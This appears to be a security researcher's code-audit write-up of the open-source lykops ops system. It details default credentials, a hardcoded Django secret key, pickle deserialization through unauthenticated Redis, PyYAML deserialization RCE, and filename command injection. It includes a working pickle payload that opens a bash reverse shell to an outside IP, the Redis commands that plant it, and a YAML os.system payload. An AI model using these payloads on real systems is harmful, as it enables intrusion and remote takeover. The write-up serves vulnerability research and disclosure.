---
title: "[Guest Post] Code Audit Notes on an Ops System (Django+MongoDB+Redis)"
slug: nqxgtn
translationKey: nqxgtn
date: 2021-02-05T05:14:41+08:00
source: yuque/penetration
---

This post was first published as a contribution to the Alibaba Cloud Xianzhi community: [Code Audit Notes on an Ops System (Django+MongoDB+Redis)](https://xz.aliyun.com/t/9195). Please credit the original source when reposting.



I encountered this system during a certain engagement, where I got a shell through a weak password plus command injection in the backend.

Later I found it quite interesting, so I spent a Saturday auditing it — and discovered that under certain conditions it allows direct RCE from the frontend...

Below is the walkthrough of this audit.

# 0x00    System Overview
The system is called: **lykops ops system**

+ Code repository: [https://github.com/lykops/lykops](https://github.com/lykops/lykops/issues/new)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612585076722-b0c1cea9-da7d-4dec-8b5f-f9c2a5609d95.png)

+ The default account and password are as follows

```basic
lykops
1qaz2wsx
```

Frontend login page

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612473328894-c9b48c7f-4e23-4d01-9d8a-c155b5073df1.png)

The page after logging into the backend

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612572847531-b796841e-c17b-48d5-b39b-300bfe47f12b.png)

+ On the database side, unlike the typical `Django` + `SQLite/MySQL` setup, it uses `MongoDB` + `Redis`
    - User data is stored in Mongo
    - Redis serves as the cache

With this combination, the attack surface grows from the web application alone to the web plus two services.



# 0x01    Default Configuration
If you clone this project's repo and use it as-is, you will be exposed to risks caused by the **default configuration**.


## Debug mode enabled by default
No explanation needed — in `lykops/settings.py`, `Debug` is on by default.

```basic
# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = True
```

How to exploit this?

— Make Django throw an error, thereby leaking sensitive information! Here I used a POST array parameter, and as you can see, the password hash has already leaked

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612474757034-754938b5-3c16-4985-a504-41d7a939e8b7.png)

## Hardcoded secret key
The source code is here, again in `lykops/settings.py`

[https://github.com/lykops/lykops/blob/ed7e35d0c1abb1eacf7ab365e041347d0862c0a7/lykops/settings.py#L29](https://github.com/lykops/lykops/blob/ed7e35d0c1abb1eacf7ab365e041347d0862c0a7/lykops/settings.py#L29)

```basic
# lykops/settings.py
SECRET_KEY = '-mii=_9j2@!^7#lbjgo6=6930#@)dle18^wdj^b@xa68=-3bed'
```

The `SECRET_KEY` in the original repo is shown above. This value is supposed to be auto-generated when each Django project is created, yet here it is hardcoded. If you can't be bothered to change it, well... In fact, Westerners discussed this issue ten years ago; see the best practice here => [distributing-django-projects-with-unique-secret-keys](https://stackoverflow.com/questions/4664724/distributing-django-projects-with-unique-secret-keys)

That said, what does this key actually do? Let's first look at the [official documentation](https://docs.djangoproject.com/zh-hans/3.1/topics/signing/#protecting-the-secret-key).

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612474620717-7f92e854-f133-490b-b90b-085ca06215d7.png)

That's right — in theory it can be used to forge signatures! After studying the article by the veteran xxlegend, [From Django's SECRET_KEY to Code Execution | xxlegend](http://xxlegend.com/2015/04/01/%E4%BB%8EDjango%E7%9A%84SECTET_KEY%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/), I also traced through the Django 1.11 source code myself and reached the following conclusions

> + In Django below 1.6, sessions use pickle for serialization by default; in 1.6 and above, JSON serialization is the default.
>
> ![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612594528715-b7f81250-8826-4be7-8673-4ce2bc7d68f9.png)
>
> + Code execution only exists in operations that use pickle serialization, i.e., Django <= 1.6
> + A tool for exploiting this kind of leaked-key issue: [https://github.com/danghvu/pwp](https://github.com/danghvu/pwp) — a pretty nice implementation approach
>

All in all, a target environment running `django 1.11` won't suffer RCE from a leaked secret key. And from my current pentest perspective, I had no pressing need to research **identity forgery** (weak passwords......), so I didn't dig deeper into exploitation schemes for **identity forgery**. (Personal habit: I prefer to analyze and solve a class of problems after actually encountering it.) If any of you are knowledgeable on this, please kindly share in the comments.

# 0x02    Unauthenticated Redis => Frontend RCE
A pickle deserialization vulnerability at the login endpoint!

## Logic Analysis
Let's first look at the login route, which is `^login.html`; the corresponding logic is the `login` function of the `Login` class

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612475501374-847a4401-d2cb-46d2-9299-c115ac80e722.png)

Following into the `login` function, for the deserialization part, we mainly need to look at line 81.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612475618950-4c5eb9e1-833a-4853-b22a-76c7f915775a.png)

Line 81 passes in the `user=adminuser` variable. By searching the codebase for the variable name, we find that the value of `adminuser` defaults to `lykops`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612475445739-a086de68-6acf-42cd-a523-729b5cd8aa8f.png)Following into `get_userinfo`, we find it simply fetches the user's login cache from Redis

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612476033853-cf359b4e-05c0-4a48-802a-e92f49068352.png)

Now let's think: user data, in the Python context, necessarily exists in the form of **Python objects**; whereas in Redis, it is most likely stored as strings. So far the understanding checks out, right?

> Redis supports five data types: **string**, hash, list, set, and zset (sorted set)
>

Going one step further: for the **string** stored in Redis to be converted into a **Python object**, there must be a deserialization implementation — and if the deserialization is not properly restricted, there's a vulnerability. So which function does it use for deserialization?![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612475982326-f7769925-4e51-4131-a1c8-2847d59d761a.png)

The implementation of this `get`, when the input parameter is `fmt=obj`, deserializes [the `string` fetched from Redis] — and the deserialization function is, incredibly, `pickle.loads`!

> If you're not yet familiar with Python deserialization attacks, you can refer to the post [Python Deserialization Attacks from Scratch](https://zhuanlan.zhihu.com/p/89132768).
>
> The image below is a small demo of achieving command execution via deserialization in a Python cmdline
>
> ![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612476909279-aca2a57b-0dfb-4bbc-85f5-18be7a866696.png)
>

Simply put, what we need to do is:

+ Exploit the fact that a Python class's `__reduce__` method gets executed during pickle deserialization: first construct a malicious string, then achieve command execution through deserialization.
+ `pickle.loads` requires its input to be of type `Byte`, and the result fetched from Redis is of type `Byte` by default, so no extra encoding conversion is needed.
+ In actual exploitation, all you need is unauthenticated access to Redis: we can overwrite the `value` of `lykops` to inject a malicious string for Python to deserialize, thereby achieving command execution!



## Exploitation

The payload generation code is as follows

```basic
#!/usr/bin/env python3
import pickle
import os

class py():
	def __reduce__(self):
		return (os.system, ('bash -i >& /dev/tcp/10.10.111.2/1337 0>&1',))

payload = pickle.dumps(py()) 
# b'\x80\x03cposix\nsystem\nq\x00X)\x00\x00\x00bash -i >& /dev/tcp/10.10.111.1/1337 0>&1q\x01\x85q\x02Rq\x03.'
```



Below is the attack walkthrough. First, connect to Redis using the hardcoded Redis password `1qaz2wsx`. There were existing values inside; the user hashes could be fed to `hydra` for cracking, which I won't cover here.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612580856779-b800fe78-e01c-4d83-b345-f2792b9bc169.png)

Write the malicious string for the reverse shell

```basic
# 写入key
set lykops:userinfo "\x80\x03cposix\nsystem\nq\x00X)\x00\x00\x00bash -i >& /dev/tcp/10.10.111.1/1337 0>&1q\x01\x85q\x02Rq\x03."

# 查看key
get lykops:userinfo

# 重置key，后续用于恢复网站
set lykops:userinfo 1
```

Click login, and the RCE triggers!

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612582105547-4feb00ab-230e-4b41-98d8-d4d498eef68b.png)

One more remark here. For whatever reason, Django keeps deserializing the data in `lykops:userinfo` — and this process is blocking, so after we get the shell, we'll see the site hang. To restore the site, you need to reset the key.



When you see this, you'll notice this exploitation idea is quite similar to the one in P-niu's article [Python Vulnerability Hunting on a Zhangyue iReader Site | Leavesongs](https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html), right? Indeed — the reason I thought to look at this point was precisely that article of P-niu's popping into my head. Young folks should learn more from their predecessors ; D



# 0x03    Backend YAML Deserialization
Python has a deserialization vulnerability when parsing YAML-formatted content. Referring to the article [A Brief Discussion of the PyYAML Deserialization Vulnerability](https://xz.aliyun.com/t/7923#toc-5), we get the following key points

> + Before PyYAML version 5.1, we have the following deserialization methods:
>
> load(data)
>
> load(data, Loader=Loader)
>
> load_all(data)
>
> load_all(data, Loader=Loader)
>
> + When yaml deserializes, it dynamically creates new Python class objects based on the parameters, or creates objects by referencing classes from modules, and thus can execute arbitrary commands~
>

Therefore, as long as Python code contains `yaml.load()` with controllable parameters, the `yaml` deserialization can be leveraged for RCE.

## Logic Analysis
First, while testing the previous issue, I noticed something

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612593173999-aedf70b5-2b8d-4eb3-9017-2cb86c8377fc.png)

Python performs YAML syntax checking, so parsing yaml files very likely uses `yaml.load`!

So let's follow the code — search the codebase for `yaml.load`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612592899261-cced0b08-9cea-4672-9268-14b19b869b77.png)

There's a facade method `yaml_loader` on the outside,

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612592953829-15ac886f-3762-4f26-9302-a644e8a7d95a.png)

No filtering, and a pile of call sites — so basically no need to trace further.

Before exploiting, though, we still need to check the version, because PyYAML 5.1 is the boundary: the exploitation methods above and below it differ.

Does this project pin a PyYAML version? Check [requirements.txt](https://github.com/lykops/lykops/blob/master/doc/install/requirements.txt)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612592443562-d67902f7-2961-4815-ab98-3089d6d71f79.png)

No version is pinned. So look on the local machine

```basic
>>> python3 -m pip list |grep PyYAML
PyYAML   3.12
```

It's Py3's default `PyYAML 3.12` — exactly the ideal deserialization scenario. Let's go!

## Exploitation
Still the upload point from 0x02 above; just construct the following content and send it

```basic
!!python/object/new:os.system ["sleep 2"]
```

RCE!

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612591756907-9e8c62dc-6c3e-40d1-8f3c-3130a1cfc346.png)

It's just that this command execution point runs a command only once, making it all the more pure.

# 0x04    Backend Command Injection Vulnerability
## Logic Analysis
Search the codebase for common command-execution functions

```basic
os\.system|os\.popen|subprocess\.|exec\(|commands\.|os\.spawn
```

I spotted an interesting spot — a file path is passed in directly?

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612583439689-0c316848-a62a-43bd-8526-43f79521cfba.png)

We follow into the `upload_file` function in `lykops/library/utils/file.py#248`, where we can see there is no filtering at all

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612583548282-85f9eda0-1c90-4d4a-a6b8-edef5d537447.png)

So where does the `file` variable come from?

Looking at the function's callers, we follow to `import_upload`, then trace further up

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612583785070-0d6cf023-2fec-4ea7-813c-513b5a7d7d62.png)

Finally, at `lykops/lykops/ansible/yaml.py#74`, I found the entry point of this vulnerability: the file variable comes from our HTTP request.

The corresponding route is `^ansible/yaml/import$`.

You can see that if an error occurs during upload, the `import_file` function gets called twice — i.e., the command executes twice.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612584021432-4b7e9a15-5da6-499c-961a-7f47eb7cf310.png)

## Exploitation
We access it directly, upload a file and intercept the request

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612584182665-cb0e62ec-6dd5-46ee-adec-90cbff59fcb2.png)

Change the filename, and the command injection is complete.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612584454869-2e94095e-20ea-4eaa-b1e0-484e86b7af1a.png)





# 0x0?    Unauthenticated Add-Admin Endpoint
While installing this system, I noticed that you can add an administrator at the very beginning,

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612580475063-084fb040-8874-49d8-9e3f-7407b77e782e.png)

The route is here

```python
url(r'^user/create_admin', Login(mongoclient=mongoclient, redisclient=redisclient).create_admin, name='create_admin'),
```

Now let's look at the implementation code for `creating an administrator`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612586203746-b47dd619-370c-486b-a8ad-f8f301d4db0a.png)

Clearly problematic. It first checks the request method: if it's a `GET` request, it queries MongoDB for whether a superadmin user currently exists (the default value is `lykops`, as mentioned above), and if none exists, it renders the **create administrator** template.

My dear developer, please stop writing things so convolutedly — for POST requests, you have no authentication whatsoever.



But but but — I hadn't noticed that it forcibly specifies creating an `adminuser` afterwards, so it actually can't be exploited at all...![](https://cdn.nlark.com/yuque/0/2021/png/166008/1612588081205-cf445822-91ac-45a1-b98b-56d50f49b477.png)

---

# Summary
Thanks for reading!

After this round of code auditing, the ways to get a shell turned out to be many and varied; but no matter what, the root cause is always ops/dev personnel lacking security awareness and cutting corners for convenience.

Along the way, I also learned some best practices — for example, when distributing a Django project with a dynamically imported `SECRET_KEY`, it's best to use the system's environment variables.

Furthermore, if we raise the bar a bit — elevating to secure design. From this fragile project, another example comes to mind: think about why the BT (BaoTa) panel's account and password are not saved in a config file, but instead require running a command, `bt default`, to reveal them? One of the reasons, isn't it precisely to prevent them from being swiped by vulnerabilities like **local arbitrary file read**?

Remember: vulnerabilities often work in combination. The goal of secure design is to reduce security dependencies between components — if the moat falls, there's still the city gate; if the gate is breached, there are still sentries.

So, my personal take: studying security means learning not only security techniques but also security philosophy — extrapolating from one case to others is what produces a qualitative leap.

# Refs
+ Minimized risk of SECRET_KEY leak. [https://github.com/django/django/pull/2714](https://github.com/django/django/pull/2714)
+ [https://github.com/danghvu/pwp/blob/master/exploit.py](https://github.com/danghvu/pwp/blob/master/exploit.py)
+ A Brief Discussion of the PyYAML Deserialization Vulnerability - Xianzhi Community [https://xz.aliyun.com/t/7923#toc-10](https://xz.aliyun.com/t/7923#toc-10)
+ From Django's SECRET_KEY to Code Execution | xxlegend[http://xxlegend.com/2015/04/01/%E4%BB%8EDjango%E7%9A%84SECTET_KEY%E5%88%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/](http://xxlegend.com/2015/04/01/%25E4%25BB%258EDjango%25E7%259A%2584SECTET_KEY%25E5%2588%25B0%25E4%25BB%25A3%25E7%25A0%2581%25E6%2589%25A7%25E8%25A1%258C/)

# Appendix: Deployment Guide
When deploying this code, I stepped on a few small pitfalls, so I added some content on top of the official installation instructions and put it in the attachment.

Masters who want to analyze it yourselves can set up the environment and do a reproduction.

One last thing: this code is basically only used on intranets (I couldn't find a single instance on FOFA anyway).

Therefore, **please set it up locally and do NOT use it in a production environment!**

[Deployment Manual (Chinese)](https://www.yuque.com/attachments/yuque/0/2021/md/166008/1612595303702-588ec474-ddd1-4b50-87e4-b3b084a810a0.md)

# 
